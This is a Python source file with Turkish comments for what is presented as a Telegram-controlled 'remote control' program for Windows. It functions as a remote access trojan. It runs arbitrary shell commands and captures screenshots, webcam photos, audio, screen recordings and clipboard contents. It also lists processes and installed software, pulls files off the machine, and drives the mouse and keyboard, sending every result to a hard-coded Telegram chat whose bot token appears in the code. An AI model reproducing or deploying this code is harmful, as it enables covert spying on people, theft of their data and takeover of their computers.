import os
import sys
import time
import logging
import platform
import psutil
import subprocess
import shutil
import win32gui
import win32process
import win32api
import win32con
import win32clipboard
from datetime import datetime
from PIL import ImageGrab
import asyncio
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
import socket
import json
import base64
import traceback
import re
import queue
import requests
import pyautogui
import cv2
import numpy as np
import sounddevice as sd
import soundfile as sf
import threading
import webbrowser
import winreg
import ctypes
from ctypes import wintypes
import uuid
import pyzipper
from cryptography.fernet import Fernet
import zipfile
import io
import mss
import mss.tools
from pynput import mouse, keyboard

# Logging ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('remote_control.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

class RemoteControl:
    def __init__(self, telegram_token, chat_id):
        self.telegram_token = telegram_token
        self.chat_id = chat_id
        self.is_running = True
        self.last_update_id = 0
        self.command_check_interval = 1
        self.current_directory = os.getcwd()
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 5
        self.reconnect_delay = 5
        self.command_queue = queue.Queue()
        self.command_history = []
        self.max_command_history = 10
        self.command_cooldown = 3
        self.last_command_time = 0
        self.initialized = False
        self.webcam = None
        self.recording = False
        self.audio_recording = False
        self.last_error_time = 0
        self.error_cooldown = 5
        self.screen_recording = False
        self.encryption_key = Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)
        self.mouse_controller = mouse.Controller()
        self.keyboard_controller = keyboard.Controller()
        
    def is_valid_command(self, text):
        """Geçerli bir komut olup olmadığını kontrol et"""
        if not text:
            return False
        return bool(re.compile(r'^/[a-zA-Z]+').match(text))

    def can_execute_command(self, command):
        """Komutun çalıştırılıp çalıştırılamayacağını kontrol et"""
        current_time = time.time()
        
        # Program başlatıldı mı kontrol et
        if not self.initialized and command != '/help':
            logging.warning("Program henüz başlatılmadı. Sadece /help komutu kullanılabilir.")
            return False
            
        # Komutlar arası bekleme süresini kontrol et
        if current_time - self.last_command_time < self.command_cooldown:
            logging.warning(f"Komutlar arası bekleme süresi yetersiz. {self.command_cooldown} saniye bekleyin.")
            return False
            
        # /stop komutu için özel kontroller
        if command == '/stop':
            if len(self.command_history) < 3:  # En az 3 komut işlenmiş olmalı
                logging.warning("Güvenlik: /stop komutu reddedildi - yeterli komut işlenmemiş")
                return False
                
            # Son 3 komutta /stop var mı kontrol et
            last_commands = self.command_history[-3:]
            if '/stop' in last_commands:
                logging.warning("Güvenlik: /stop komutu reddedildi - son komutlarda /stop var")
                return False
                
            # Son komut /stop değilse ve yeterli süre geçtiyse izin ver
            return True
            
        self.last_command_time = current_time
        return True

    async def send_telegram_message(self, message):
        """Telegram'a mesaj gönder"""
        try:
            current_time = time.time()
            if current_time - self.last_error_time < self.error_cooldown:
                return
                
            bot = Bot(token=self.telegram_token)
            await bot.send_message(chat_id=self.chat_id, text=message)
            logging.info(f"Mesaj gönderildi: {message[:50]}...")
            self.reconnect_attempts = 0
        except Exception as e:
            logging.error(f"Mesaj gönderilirken hata: {str(e)}\n{traceback.format_exc()}")
            self.reconnect_attempts += 1
            self.last_error_time = current_time
            if self.reconnect_attempts >= self.max_reconnect_attempts:
                logging.error("Maksimum yeniden bağlanma denemesi aşıldı. Program yeniden başlatılıyor...")
                await self.restart_program()

    async def restart_program(self):
        """Programı yeniden başlat"""
        try:
            logging.info("Program yeniden başlatılıyor...")
            python = sys.executable
            os.execl(python, python, *sys.argv)
        except Exception as e:
            logging.error(f"Program yeniden başlatılırken hata: {str(e)}")
            sys.exit(1)

    async def send_telegram_file(self, file_path, caption=""):
        """Telegram'a dosya gönder"""
        try:
            bot = Bot(token=self.telegram_token)
            with open(file_path, 'rb') as file:
                await bot.send_document(chat_id=self.chat_id, document=file, caption=caption)
            logging.info(f"Dosya gönderildi: {file_path}")
        except Exception as e:
            logging.error(f"Dosya gönderilirken hata: {str(e)}")

    def get_system_info(self):
        """Sistem bilgilerini topla"""
        try:
            info = {
                "Sistem": platform.system(),
                "Sürüm": platform.version(),
                "Makine": platform.machine(),
                "İşlemci": platform.processor(),
                "RAM": f"{round(psutil.virtual_memory().total / (1024.0 ** 3), 2)} GB",
                "Kullanıcı": os.getlogin(),
                "Bilgisayar Adı": platform.node(),
                "IP Adresi": socket.gethostbyname(socket.gethostname()),
                "Çalışma Süresi": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())),
                "Disk Kullanımı": f"{round(psutil.disk_usage('/').percent)}%"
            }
            return "\n".join([f"{k}: {v}" for k, v in info.items()])
        except Exception as e:
            logging.error(f"Sistem bilgileri alınırken hata: {str(e)}")
            return f"Sistem bilgileri alınamadı: {str(e)}"

    def get_cpu_usage(self):
        """CPU kullanımını al"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            cpu_count = psutil.cpu_count()
            cpu_freq = psutil.cpu_freq()
            return f"CPU Kullanımı: {cpu_percent}%\nCPU Çekirdek Sayısı: {cpu_count}\nCPU Frekansı: {cpu_freq.current:.2f} MHz"
        except Exception as e:
            logging.error(f"CPU kullanımı alınırken hata: {str(e)}")
            return f"CPU kullanımı alınamadı: {str(e)}"

    def get_memory_usage(self):
        """RAM kullanımını al"""
        try:
            memory = psutil.virtual_memory()
            swap = psutil.swap_memory()
            return f"RAM Kullanımı: {memory.percent}%\nToplam RAM: {round(memory.total / (1024.0 ** 3), 2)} GB\nKullanılan RAM: {round(memory.used / (1024.0 ** 3), 2)} GB\nBoş RAM: {round(memory.available / (1024.0 ** 3), 2)} GB\nSwap Kullanımı: {swap.percent}%"
        except Exception as e:
            logging.error(f"RAM kullanımı alınırken hata: {str(e)}")
            return f"RAM kullanımı alınamadı: {str(e)}"

    def get_disk_usage(self):
        """Disk kullanımını al"""
        try:
            partitions = psutil.disk_partitions()
            disk_info = []
            for partition in partitions:
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disk_info.append(f"Sürücü: {partition.device}\nBağlantı Noktası: {partition.mountpoint}\nToplam: {round(usage.total / (1024.0 ** 3), 2)} GB\nKullanılan: {round(usage.used / (1024.0 ** 3), 2)} GB\nBoş: {round(usage.free / (1024.0 ** 3), 2)} GB\nKullanım: {usage.percent}%")
                except:
                    continue
            return "\n\n".join(disk_info)
        except Exception as e:
            logging.error(f"Disk kullanımı alınırken hata: {str(e)}")
            return f"Disk kullanımı alınamadı: {str(e)}"

    def get_network_usage(self):
        """Ağ kullanımını al"""
        try:
            net_io = psutil.net_io_counters()
            return f"Gönderilen: {round(net_io.bytes_sent / (1024.0 ** 2), 2)} MB\nAlınan: {round(net_io.bytes_recv / (1024.0 ** 2), 2)} MB\nGönderilen Paketler: {net_io.packets_sent}\nAlınan Paketler: {net_io.packets_recv}"
        except Exception as e:
            logging.error(f"Ağ kullanımı alınırken hata: {str(e)}")
            return f"Ağ kullanımı alınamadı: {str(e)}"

    def take_screenshot(self):
        """Ekran görüntüsü al"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            return filename
        except Exception as e:
            logging.error(f"Ekran görüntüsü alınırken hata: {str(e)}")
            return None

    def get_process_list(self):
        """Çalışan işlemleri listele"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
                try:
                    mem_percent = round(proc.info['memory_percent'], 1)
                    processes.append(f"PID: {proc.info['pid']} - İsim: {proc.info['name']} - Kullanıcı: {proc.info['username']} - RAM: {mem_percent}%")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return "\n".join(processes[:50])  # İlk 50 işlemi göster
        except Exception as e:
            logging.error(f"İşlem listesi alınırken hata: {str(e)}")
            return f"İşlem listesi alınamadı: {str(e)}"

    def execute_command(self, command):
        """Komut çalıştır"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8')
            if result.returncode == 0:
                return result.stdout if result.stdout else "Komut başarıyla çalıştırıldı."
            else:
                return f"Hata: {result.stderr}"
        except Exception as e:
            logging.error(f"Komut çalıştırılırken hata: {str(e)}")
            return f"Komut çalıştırılamadı: {str(e)}"

    def list_directory(self, path="."):
        """Dizin içeriğini listele"""
        try:
            if not os.path.exists(path):
                return f"Dizin bulunamadı: {path}"
                
            items = os.listdir(path)
            result = []
            for item in items:
                try:
                    full_path = os.path.join(path, item)
                    if os.path.isdir(full_path):
                        result.append(f"[Dizin] {item}")
                    else:
                        size = os.path.getsize(full_path)
                        result.append(f"[Dosya] {item} ({size} bytes)")
                except Exception:
                    result.append(f"[Erişilemeyen] {item}")
            return "\n".join(result)
        except Exception as e:
            logging.error(f"Dizin listelenirken hata: {str(e)}")
            return f"Dizin listelenemedi: {str(e)}"

    def get_clipboard(self):
        """Pano içeriğini al"""
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                win32clipboard.CloseClipboard()
                return data.decode('utf-8', errors='ignore')
            return "Pano boş"
        except Exception as e:
            logging.error(f"Pano içeriği alınırken hata: {str(e)}")
            return "Pano içeriği alınamadı"
        finally:
            try:
                win32clipboard.CloseClipboard()
            except:
                pass

    def get_public_ip(self):
        """Public IP adresini al"""
        try:
            response = requests.get('https://api.ipify.org?format=json')
            return response.json()['ip']
        except:
            return "IP alınamadı"

    def get_network_info(self):
        """Ağ bilgilerini topla"""
        try:
            info = {
                "Public IP": self.get_public_ip(),
                "Local IP": socket.gethostbyname(socket.gethostname()),
                "MAC Adresi": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
                "Ağ Adaptörleri": []
            }
            
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        info["Ağ Adaptörleri"].append(f"{interface}: {addr.address}")
            
            return "\n".join([f"{k}: {v}" for k, v in info.items()])
        except Exception as e:
            return f"Ağ bilgileri alınırken hata: {str(e)}"

    def start_webcam(self):
        """Webcam'i başlat"""
        try:
            self.webcam = cv2.VideoCapture(0)
            return True
        except Exception as e:
            logging.error(f"Webcam başlatılırken hata: {str(e)}")
            return False

    def stop_webcam(self):
        """Webcam'i durdur"""
        if self.webcam:
            self.webcam.release()
            self.webcam = None

    def take_webcam_photo(self):
        """Webcam'den fotoğraf çek"""
        try:
            if not self.webcam:
                if not self.start_webcam():
                    return None
                    
            ret, frame = self.webcam.read()
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_{timestamp}.jpg"
                cv2.imwrite(filename, frame)
                return filename
            return None
        except Exception as e:
            logging.error(f"Webcam fotoğrafı alınırken hata: {str(e)}")
            return None

    def start_audio_recording(self, duration=10):
        """Ses kaydı başlat"""
        try:
            self.audio_recording = True
            recording_thread = threading.Thread(target=self._record_audio, args=(duration,))
            recording_thread.start()
            return True
        except Exception as e:
            logging.error(f"Ses kaydı başlatılırken hata: {str(e)}")
            return False

    def _record_audio(self, duration):
        """Ses kaydı yap"""
        try:
            sample_rate = 44100
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
            sd.wait()
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_{timestamp}.wav"
            sf.write(filename, recording, sample_rate)
            
            self.audio_recording = False
            return filename
        except Exception as e:
            logging.error(f"Ses kaydı yapılırken hata: {str(e)}")
            self.audio_recording = False
            return None

    def get_installed_software(self):
        """Yüklü yazılımları listele"""
        try:
            software_list = []
            keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for key_path in keys:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, subkey_name) as subkey:
                                try:
                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                    software_list.append(f"{name} (v{version})")
                                except:
                                    pass
                        except:
                            continue
            
            return "\n".join(software_list[:50])  # İlk 50 yazılımı göster
        except Exception as e:
            return f"Yazılım listesi alınırken hata: {str(e)}"

    def get_browser_history(self):
        """Tarayıcı geçmişini al"""
        try:
            history = []
            chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
            if os.path.exists(chrome_path):
                # Chrome geçmişi SQLite veritabanından okunabilir
                history.append("Chrome geçmişi bulundu")
            
            firefox_path = os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles'
            if os.path.exists(firefox_path):
                # Firefox geçmişi SQLite veritabanından okunabilir
                history.append("Firefox geçmişi bulundu")
            
            return "\n".join(history)
        except Exception as e:
            return f"Tarayıcı geçmişi alınırken hata: {str(e)}"

    def encrypt_file(self, file_path):
        """Dosyayı şifrele"""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            encrypted_data = self.fernet.encrypt(file_data)
            encrypted_path = file_path + '.encrypted'
            with open(encrypted_path, 'wb') as file:
                file.write(encrypted_data)
            return encrypted_path
        except Exception as e:
            logging.error(f"Dosya şifrelenirken hata: {str(e)}")
            return None

    def decrypt_file(self, encrypted_path):
        """Şifrelenmiş dosyayı çöz"""
        try:
            with open(encrypted_path, 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = self.fernet.decrypt(encrypted_data)
            decrypted_path = encrypted_path.replace('.encrypted', '.decrypted')
            with open(decrypted_path, 'wb') as file:
                file.write(decrypted_data)
            return decrypted_path
        except Exception as e:
            logging.error(f"Dosya şifresi çözülürken hata: {str(e)}")
            return None

    def compress_file(self, file_path, password=None):
        """Dosyayı sıkıştır"""
        try:
            zip_path = file_path + '.zip'
            if password:
                with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zf:
                    zf.setpassword(password.encode())
                    zf.write(file_path, os.path.basename(file_path))
            else:
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    zf.write(file_path, os.path.basename(file_path))
            return zip_path
        except Exception as e:
            logging.error(f"Dosya sıkıştırılırken hata: {str(e)}")
            return None

    def decompress_file(self, zip_path, password=None):
        """Sıkıştırılmış dosyayı aç"""
        try:
            extract_path = os.path.dirname(zip_path)
            if password:
                with pyzipper.AESZipFile(zip_path, 'r') as zf:
                    zf.setpassword(password.encode())
                    zf.extractall(extract_path)
            else:
                with zipfile.ZipFile(zip_path, 'r') as zf:
                    zf.extractall(extract_path)
            return extract_path
        except Exception as e:
            logging.error(f"Dosya açılırken hata: {str(e)}")
            return None

    def start_screen_recording(self, duration=10):
        """Ekran kaydı başlat"""
        try:
            self.screen_recording = True
            recording_thread = threading.Thread(target=self._record_screen, args=(duration,))
            recording_thread.start()
            return True
        except Exception as e:
            logging.error(f"Ekran kaydı başlatılırken hata: {str(e)}")
            return False

    def _record_screen(self, duration):
        """Ekran kaydı yap"""
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                frames = []
                start_time = time.time()
                
                while time.time() - start_time < duration and self.screen_recording:
                    frame = sct.grab(monitor)
                    frames.append(frame)
                    time.sleep(0.1)
                
                if frames:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    output_path = f"screen_recording_{timestamp}.mp4"
                    
                    # OpenCV ile video kaydetme
                    height, width = frames[0].height, frames[0].width
                    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                    out = cv2.VideoWriter(output_path, fourcc, 10.0, (width, height))
                    
                    for frame in frames:
                        img = np.array(frame)
                        out.write(img)
                    
                    out.release()
                    self.screen_recording = False
                    return output_path
                return None
        except Exception as e:
            logging.error(f"Ekran kaydı yapılırken hata: {str(e)}")
            self.screen_recording = False
            return None

    def control_mouse(self, action, x=None, y=None):
        """Fare kontrolü"""
        try:
            if action == 'move' and x is not None and y is not None:
                self.mouse_controller.position = (x, y)
            elif action == 'click':
                self.mouse_controller.click(mouse.Button.left)
            elif action == 'right_click':
                self.mouse_controller.click(mouse.Button.right)
            elif action == 'double_click':
                self.mouse_controller.click(mouse.Button.left, 2)
            return True
        except Exception as e:
            logging.error(f"Fare kontrolü sırasında hata: {str(e)}")
            return False

    def control_keyboard(self, action, key=None):
        """Klavye kontrolü"""
        try:
            if action == 'press' and key:
                self.keyboard_controller.press(key)
                self.keyboard_controller.release(key)
            elif action == 'type' and key:
                self.keyboard_controller.type(key)
            return True
        except Exception as e:
            logging.error(f"Klavye kontrolü sırasında hata: {str(e)}")
            return False

    async def process_command(self, command):
        """Komutu işle"""
        if not self.can_execute_command(command):
            await self.send_telegram_message("Güvenlik nedeniyle bu komut reddedildi. Lütfen daha sonra tekrar deneyin.")
            return
            
        try:
            if command == '/help':
                help_text = """
                Kullanılabilir Komutlar:
                /sysinfo - Sistem bilgilerini göster
                /network - Ağ bilgilerini göster
                /screenshot - Ekran görüntüsü al
                /webcam - Webcam fotoğrafı çek
                /record [süre] - Ses kaydı yap (saniye)
                /processes - Çalışan işlemleri listele
                /software - Yüklü yazılımları listele
                /browser - Tarayıcı geçmişini göster
                /clipboard - Pano içeriğini göster
                /ls [dizin] - Dizin içeriğini listele
                /cd [dizin] - Dizin değiştir
                /cmd [komut] - Komut çalıştır
                /download [dosya] - Dosya indir
                /upload - Dosya yükle (dosyayı gönder)
                /stop - Programı durdur
                /restart - Programı yeniden başlat
                /cpu - CPU kullanımını göster
                /memory - RAM kullanımını göster
                /disk - Disk kullanımını göster
                /netusage - Ağ kullanımını göster
                /encrypt [dosya] - Dosyayı şifrele
                /decrypt [dosya] - Şifrelenmiş dosyayı çöz
                /compress [dosya] [şifre] - Dosyayı sıkıştır
                /decompress [dosya] [şifre] - Sıkıştırılmış dosyayı aç
                /screenrecord [süre] - Ekran kaydı al
                /mouse [eylem] [x] [y] - Fare kontrolü
                /keyboard [eylem] [tuş] - Klavye kontrolü
                """
                await self.send_telegram_message(help_text)
                self.initialized = True
                
            elif command == '/sysinfo':
                sys_info = self.get_system_info()
                await self.send_telegram_message(f"Sistem Bilgileri:\n{sys_info}")
                
            elif command == '/network':
                network_info = self.get_network_info()
                await self.send_telegram_message(f"Ağ Bilgileri:\n{network_info}")
                
            elif command == '/screenshot':
                screenshot_file = self.take_screenshot()
                if screenshot_file:
                    await self.send_telegram_file(screenshot_file, "Ekran Görüntüsü")
                    os.remove(screenshot_file)
                else:
                    await self.send_telegram_message("Ekran görüntüsü alınamadı!")
                
            elif command == '/webcam':
                webcam_file = self.take_webcam_photo()
                if webcam_file:
                    await self.send_telegram_file(webcam_file, "Webcam Fotoğrafı")
                    os.remove(webcam_file)
                else:
                    await self.send_telegram_message("Webcam fotoğrafı alınamadı!")
                self.stop_webcam()
                
            elif command.startswith('/record'):
                try:
                    duration = int(command.split()[1]) if len(command.split()) > 1 else 10
                    if self.start_audio_recording(duration):
                        await self.send_telegram_message(f"{duration} saniyelik ses kaydı başlatıldı...")
                        time.sleep(duration)
                        audio_file = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                        if os.path.exists(audio_file):
                            await self.send_telegram_file(audio_file, "Ses Kaydı")
                            os.remove(audio_file)
                        else:
                            await self.send_telegram_message("Ses kaydı oluşturulamadı!")
                except Exception as e:
                    await self.send_telegram_message(f"Ses kaydı başlatılırken hata: {str(e)}")
                
            elif command == '/processes':
                processes = self.get_process_list()
                await self.send_telegram_message(f"Çalışan İşlemler:\n{processes}")
                
            elif command == '/software':
                software = self.get_installed_software()
                await self.send_telegram_message(f"Yüklü Yazılımlar:\n{software}")
                
            elif command == '/browser':
                browser_history = self.get_browser_history()
                await self.send_telegram_message(f"Tarayıcı Geçmişi:\n{browser_history}")
                
            elif command == '/clipboard':
                clipboard = self.get_clipboard()
                await self.send_telegram_message(f"Pano İçeriği:\n{clipboard}")
                
            elif command.startswith('/ls'):
                path = command[4:].strip() or "."
                dir_content = self.list_directory(path)
                await self.send_telegram_message(f"Dizin İçeriği ({path}):\n{dir_content}")
                
            elif command.startswith('/cd'):
                new_dir = command[4:].strip()
                try:
                    os.chdir(new_dir)
                    self.current_directory = os.getcwd()
                    await self.send_telegram_message(f"Dizin değiştirildi: {self.current_directory}")
                except Exception as e:
                    await self.send_telegram_message(f"Dizin değiştirilemedi: {str(e)}")
                
            elif command.startswith('/cmd'):
                cmd = command[5:].strip()
                result = self.execute_command(cmd)
                await self.send_telegram_message(f"Komut Çıktısı:\n{result}")
                
            elif command.startswith('/download'):
                file_path = command[10:].strip()
                if os.path.exists(file_path):
                    await self.send_telegram_file(file_path, f"İndirilen Dosya: {file_path}")
                else:
                    await self.send_telegram_message(f"Dosya bulunamadı: {file_path}")
                
            elif command == '/stop':
                self.is_running = False
                await self.send_telegram_message("Program durduruldu!")
                sys.exit(0)
                
            elif command == '/restart':
                await self.send_telegram_message("Program yeniden başlatılıyor...")
                await self.restart_program()
                
            elif command == '/cpu':
                cpu_info = self.get_cpu_usage()
                await self.send_telegram_message(f"CPU Bilgileri:\n{cpu_info}")
                
            elif command == '/memory':
                memory_info = self.get_memory_usage()
                await self.send_telegram_message(f"RAM Bilgileri:\n{memory_info}")
                
            elif command == '/disk':
                disk_info = self.get_disk_usage()
                await self.send_telegram_message(f"Disk Bilgileri:\n{disk_info}")
                
            elif command == '/netusage':
                network_info = self.get_network_usage()
                await self.send_telegram_message(f"Ağ Kullanımı:\n{network_info}")
                
            elif command.startswith('/encrypt'):
                file_path = command[9:].strip()
                if os.path.exists(file_path):
                    encrypted_path = self.encrypt_file(file_path)
                    if encrypted_path:
                        await self.send_telegram_file(encrypted_path, "Şifrelenmiş Dosya")
                        os.remove(encrypted_path)
                    else:
                        await self.send_telegram_message("Dosya şifrelenemedi!")
                else:
                    await self.send_telegram_message(f"Dosya bulunamadı: {file_path}")

            elif command.startswith('/decrypt'):
                file_path = command[9:].strip()
                if os.path.exists(file_path):
                    decrypted_path = self.decrypt_file(file_path)
                    if decrypted_path:
                        await self.send_telegram_file(decrypted_path, "Şifresi Çözülmüş Dosya")
                        os.remove(decrypted_path)
                    else:
                        await self.send_telegram_message("Dosya şifresi çözülemedi!")
                else:
                    await self.send_telegram_message(f"Dosya bulunamadı: {file_path}")

            elif command.startswith('/compress'):
                parts = command[10:].strip().split()
                if len(parts) >= 1:
                    file_path = parts[0]
                    password = parts[1] if len(parts) > 1 else None
                    if os.path.exists(file_path):
                        zip_path = self.compress_file(file_path, password)
                        if zip_path:
                            await self.send_telegram_file(zip_path, "Sıkıştırılmış Dosya")
                            os.remove(zip_path)
                        else:
                            await self.send_telegram_message("Dosya sıkıştırılamadı!")
                    else:
                        await self.send_telegram_message(f"Dosya bulunamadı: {file_path}")

            elif command.startswith('/decompress'):
                parts = command[12:].strip().split()
                if len(parts) >= 1:
                    file_path = parts[0]
                    password = parts[1] if len(parts) > 1 else None
                    if os.path.exists(file_path):
                        extract_path = self.decompress_file(file_path, password)
                        if extract_path:
                            await self.send_telegram_message(f"Dosya açıldı: {extract_path}")
                        else:
                            await self.send_telegram_message("Dosya açılamadı!")
                    else:
                        await self.send_telegram_message(f"Dosya bulunamadı: {file_path}")

            elif command.startswith('/screenrecord'):
                try:
                    duration = int(command.split()[1]) if len(command.split()) > 1 else 10
                    if self.start_screen_recording(duration):
                        await self.send_telegram_message(f"{duration} saniyelik ekran kaydı başlatıldı...")
                        time.sleep(duration)
                        video_file = f"screen_recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
                        if os.path.exists(video_file):
                            await self.send_telegram_file(video_file, "Ekran Kaydı")
                            os.remove(video_file)
                        else:
                            await self.send_telegram_message("Ekran kaydı oluşturulamadı!")
                except Exception as e:
                    await self.send_telegram_message(f"Ekran kaydı başlatılırken hata: {str(e)}")

            elif command.startswith('/mouse'):
                parts = command[7:].strip().split()
                if len(parts) >= 1:
                    action = parts[0]
                    x = int(parts[1]) if len(parts) > 1 else None
                    y = int(parts[2]) if len(parts) > 2 else None
                    if self.control_mouse(action, x, y):
                        await self.send_telegram_message("Fare kontrolü başarılı!")
                    else:
                        await self.send_telegram_message("Fare kontrolü başarısız!")

            elif command.startswith('/keyboard'):
                parts = command[10:].strip().split()
                if len(parts) >= 2:
                    action = parts[0]
                    key = parts[1]
                    if self.control_keyboard(action, key):
                        await self.send_telegram_message("Klavye kontrolü başarılı!")
                    else:
                        await self.send_telegram_message("Klavye kontrolü başarısız!")

            else:
                await self.send_telegram_message(f"Bilinmeyen komut: {command}\nKullanılabilir komutlar için /help yazın")
                
            # Komutu geçmişe ekle
            self.command_history.append(command)
            if len(self.command_history) > self.max_command_history:
                self.command_history.pop(0)
                
        except Exception as e:
            error_msg = f"Komut işlenirken hata: {str(e)}\n{traceback.format_exc()}"
            logging.error(error_msg)
            await self.send_telegram_message(f"Komut işlenirken hata oluştu: {str(e)}")

    async def check_commands(self):
        """Telegram'dan gelen komutları kontrol et"""
        try:
            bot = Bot(token=self.telegram_token)
            updates = await bot.get_updates(offset=self.last_update_id + 1, timeout=1)
            
            for update in updates:
                if update.message and update.message.text:
                    self.last_update_id = update.update_id
                    command = update.message.text.strip()
                    
                    # Komut kuyruğuna ekle
                    self.command_queue.put(command)
                    
        except Exception as e:
            error_msg = f"Komut kontrolü sırasında hata: {str(e)}\n{traceback.format_exc()}"
            logging.error(error_msg)
            self.reconnect_attempts += 1
            if self.reconnect_attempts >= self.max_reconnect_attempts:
                logging.error("Maksimum yeniden bağlanma denemesi aşıldı. Program yeniden başlatılıyor...")
                await self.restart_program()
            
            logging.info(f"{self.reconnect_delay} saniye sonra yeniden bağlanmayı deneyecek...")
            await asyncio.sleep(self.reconnect_delay)

    async def start(self):
        """Programı başlat"""
        try:
            system_info = self.get_system_info()
            await self.send_telegram_message(f"Uzaktan Kontrol Başlatıldı\n\nSistem Bilgileri:\n{system_info}")
            await self.send_telegram_message("Komutlar için /help yazın")
            
            while self.is_running:
                # Komut kontrolü
                await self.check_commands()
                
                # Kuyruktaki komutları işle
                try:
                    while not self.command_queue.empty():
                        command = self.command_queue.get_nowait()
                        await self.process_command(command)
                except queue.Empty:
                    pass
                
                await asyncio.sleep(self.command_check_interval)
                
        except Exception as e:
            error_msg = f"Program başlatılırken hata: {str(e)}\n{traceback.format_exc()}"
            logging.error(error_msg)
            sys.exit(1)

if __name__ == "__main__":
    try:
        TELEGRAM_TOKEN = "7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA"
        CHAT_ID = "7876976839"
        
        remote = RemoteControl(TELEGRAM_TOKEN, CHAT_ID)
        asyncio.run(remote.start())
    except Exception as e:
        logging.error(f"Program başlatılırken kritik hata: {str(e)}\n{traceback.format_exc()}")
        sys.exit(1) 